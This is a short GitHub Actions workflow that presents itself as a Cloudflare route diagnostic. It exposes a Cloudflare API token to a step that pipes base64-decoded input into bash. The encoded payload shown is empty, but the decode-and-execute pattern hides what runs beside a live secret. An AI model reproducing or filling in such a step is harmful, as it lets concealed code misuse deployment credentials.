name: Cloudflare Route Diagnostic

on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  diagnose:
    if: github.head_ref == 'ops/cloudflare-route-diagnostic'
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    env:
      CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
      CLOUDFLARE_ACCOUNT_ID: 9021b712f9a73815e6b333a4870e0021
    steps:
      - name: Inspect active Worker and routes
        run: echo '' | base64 -d | bash
